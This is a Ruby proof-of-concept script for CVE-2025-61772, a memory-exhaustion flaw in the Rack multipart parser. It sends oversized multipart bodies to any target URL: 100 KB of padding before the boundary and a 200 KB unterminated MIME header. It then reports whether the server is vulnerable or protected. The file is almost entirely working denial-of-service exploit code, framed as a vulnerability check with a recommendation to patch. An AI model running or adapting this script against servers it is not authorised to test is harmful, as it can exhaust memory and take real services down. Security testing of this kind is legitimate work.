#!/usr/bin/env ruby
# CVE-2025-61772 Proof of Concept
# Memory Exhaustion via Unbounded Multipart Header Buffering
#
# This script demonstrates the vulnerability by sending crafted multipart
# requests that cause unbounded memory accumulation in the Rack parser.

require 'net/http'
require 'uri'

class CVE_2025_61772_PoC
  ATTACK_VECTORS = {
    boundary_exhaustion: {
      name: "Boundary Search Memory Exhaustion",
      description: "Send large data before multipart boundary to exhaust memory",
      limit: 16 * 1024, # 16 KB limit in patched version
      test_size: 100 * 1024 # 100 KB to trigger vulnerability
    },
    mime_header_exhaustion: {
      name: "MIME Header Memory Exhaustion",
      description: "Send large MIME header without proper termination",
      limit: 64 * 1024, # 64 KB limit in patched version
      test_size: 200 * 1024 # 200 KB to trigger vulnerability
    }
  }

  def initialize(target_url, verbose: true)
    @uri = URI.parse(target_url)
    @verbose = verbose
    @boundary = "AaB03x"
  end

  def log(message, level: :info)
    return unless @verbose
    
    prefix = case level
             when :success then "✅"
             when :error then "❌"
             when :attack then "⚔️ "
             when :info then "ℹ️ "
             else "  "
             end
    
    puts "#{prefix} #{message}"
  end

  def test_normal_request
    log "Testing normal multipart request (baseline)...", level: :info
    
    body = build_normal_multipart
    
    begin
      response = send_request(body)
      log "Normal request: #{response.code} (#{response.message})", level: :success
      return { success: true, code: response.code }
    rescue => e
      log "Normal request failed: #{e.message}", level: :error
      return { success: false, error: e.message }
    end
  end

  def test_boundary_exhaustion
    log "\n" + "="*70, level: :attack
    log "ATTACK 1: #{ATTACK_VECTORS[:boundary_exhaustion][:name]}", level: :attack
    log "="*70, level: :attack
    log ATTACK_VECTORS[:boundary_exhaustion][:description]
    log "Sending #{ATTACK_VECTORS[:boundary_exhaustion][:test_size] / 1024}KB before boundary..."
    log "Vulnerable: Will buffer all data → Memory exhaustion"
    log "Patched: Will reject after #{ATTACK_VECTORS[:boundary_exhaustion][:limit] / 1024}KB → Protected"
    
    body = build_boundary_exhaustion_attack
    
    begin
      response = send_request(body, timeout: 5)
      log "Response: #{response.code} #{response.message}", level: :info
      log "Body: #{response.body[0..200]}..." if response.body
      
      if response.code.to_i >= 400
        log "Server rejected request (PROTECTED)", level: :success
        return { vulnerable: false, protected: true, code: response.code }
      else
        log "Server accepted large boundary data (VULNERABLE)", level: :error
        return { vulnerable: true, protected: false, code: response.code }
      end
    rescue Net::ReadTimeout, Timeout::Error => e
      log "Connection timeout - possible memory exhaustion (VULNERABLE)", level: :error
      return { vulnerable: true, protected: false, error: "timeout" }
    rescue => e
      log "Error: #{e.class} - #{e.message}", level: :info
      
      # Check if it's a connection reset (server crashed/rejected)
      if e.message =~ /Connection reset|Broken pipe|reset by peer/i
        log "Connection reset - server rejected request (PROTECTED)", level: :success
        return { vulnerable: false, protected: true, error: e.message }
      else
        log "Unexpected error", level: :error
        return { vulnerable: :unknown, error: e.message }
      end
    end
  end

  def test_mime_header_exhaustion
    log "\n" + "="*70, level: :attack
    log "ATTACK 2: #{ATTACK_VECTORS[:mime_header_exhaustion][:name]}", level: :attack
    log "="*70, level: :attack
    log ATTACK_VECTORS[:mime_header_exhaustion][:description]
    log "Sending #{ATTACK_VECTORS[:mime_header_exhaustion][:test_size] / 1024}KB MIME header..."
    log "Vulnerable: Will buffer all header data → Memory exhaustion"
    log "Patched: Will reject after #{ATTACK_VECTORS[:mime_header_exhaustion][:limit] / 1024}KB → Protected"
    
    body = build_mime_header_exhaustion_attack
    
    begin
      response = send_request(body, timeout: 5)
      log "Response: #{response.code} #{response.message}", level: :info
      log "Body: #{response.body[0..200]}..." if response.body
      
      if response.code.to_i >= 400
        log "Server rejected request (PROTECTED)", level: :success
        return { vulnerable: false, protected: true, code: response.code }
      else
        log "Server accepted large MIME header (VULNERABLE)", level: :error
        return { vulnerable: true, protected: false, code: response.code }
      end
    rescue Net::ReadTimeout, Timeout::Error => e
      log "Connection timeout - possible memory exhaustion (VULNERABLE)", level: :error
      return { vulnerable: true, protected: false, error: "timeout" }
    rescue => e
      log "Error: #{e.class} - #{e.message}", level: :info
      
      if e.message =~ /Connection reset|Broken pipe|reset by peer/i
        log "Connection reset - server rejected request (PROTECTED)", level: :success
        return { vulnerable: false, protected: true, error: e.message }
      else
        log "Unexpected error", level: :error
        return { vulnerable: :unknown, error: e.message }
      end
    end
  end

  def run_all_tests
    results = {
      normal: test_normal_request,
      boundary_exhaustion: test_boundary_exhaustion,
      mime_header_exhaustion: test_mime_header_exhaustion
    }
    
    print_summary(results)
    results
  end

  private

  def build_normal_multipart
    <<~MULTIPART
      \r\n--#{@boundary}\r
      Content-Disposition: form-data; name="file"; filename="test.txt"\r
      Content-Type: text/plain\r
      \r
      Hello, World!\r
      --#{@boundary}--\r
    MULTIPART
  end

  def build_boundary_exhaustion_attack
    # Send large amount of data BEFORE the actual boundary
    # Vulnerable versions will keep buffering this data
    garbage = "X" * ATTACK_VECTORS[:boundary_exhaustion][:test_size]
    
    <<~MULTIPART
      #{garbage}\r\n--#{@boundary}\r
      Content-Disposition: form-data; name="file"; filename="test.txt"\r
      Content-Type: text/plain\r
      \r
      data\r
      --#{@boundary}--\r
    MULTIPART
  end

  def build_mime_header_exhaustion_attack
    # Send properly formed boundary but huge MIME header without termination
    # The header never ends with \r\n\r\n, causing unbounded buffering
    huge_header = "X-Custom-Header: " + ("Y" * ATTACK_VECTORS[:mime_header_exhaustion][:test_size])
    
    <<~MULTIPART
      \r\n--#{@boundary}\r
      Content-Disposition: form-data; name="file"; filename="test.txt"\r
      #{huge_header}\r
      --#{@boundary}--\r
    MULTIPART
  end

  def send_request(body, timeout: 30)
    http = Net::HTTP.new(@uri.host, @uri.port)
    http.read_timeout = timeout
    http.open_timeout = timeout
    
    request = Net::HTTP::Post.new(@uri.path)
    request['Content-Type'] = "multipart/form-data; boundary=#{@boundary}"
    request.body = body
    
    http.request(request)
  end

  def print_summary(results)
    log "\n" + "="*70
    log "TEST SUMMARY - CVE-2025-61772"
    log "="*70
    
    log "\nBaseline Test:"
    log "  Normal Request: #{results[:normal][:success] ? '✅ PASS' : '❌ FAIL'}"
    
    log "\nVulnerability Tests:"
    
    [:boundary_exhaustion, :mime_header_exhaustion].each do |test|
      result = results[test]
      status = if result[:protected]
                 "✅ PROTECTED"
               elsif result[:vulnerable]
                 "❌ VULNERABLE"
               else
                 "⚠️  UNKNOWN"
               end
      
      log "  #{ATTACK_VECTORS[test][:name]}:"
      log "    Status: #{status}"
      log "    Response: #{result[:code] || result[:error]}"
    end
    
    log "\nOVERALL VERDICT:"
    vulnerable_count = results.values.count { |r| r[:vulnerable] == true }
    
    if vulnerable_count > 0
      log "  ❌ SYSTEM IS VULNERABLE TO CVE-2025-61772", level: :error
      log "  #{vulnerable_count} attack vector(s) succeeded"
      log "  RECOMMENDATION: Apply security patch immediately"
    else
      log "  ✅ SYSTEM IS PROTECTED AGAINST CVE-2025-61772", level: :success
      log "  All attack vectors were mitigated"
      log "  Memory limits are properly enforced"
    end
    
    log "="*70 + "\n"
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.empty?
    puts "Usage: #{$0} <target_url>"
    puts "Example: #{$0} http://localhost:9292/upload"
    exit 1
  end

  target_url = ARGV[0]
  
  puts "╔════════════════════════════════════════════════════════════════╗"
  puts "║  CVE-2025-61772 Proof of Concept                              ║"
  puts "║  Multipart Parser Memory Exhaustion                           ║"
  puts "╚════════════════════════════════════════════════════════════════╝"
  puts ""
  puts "Target: #{target_url}"
  puts "CVE: CVE-2025-61772"
  puts "CWE: CWE-400 (Uncontrolled Resource Consumption)"
  puts "Severity: 7.5 HIGH"
  puts ""

  poc = CVE_2025_61772_PoC.new(target_url)
  results = poc.run_all_tests
  
  # Exit with appropriate code
  exit(results.values.any? { |r| r[:vulnerable] == true } ? 1 : 0)
end

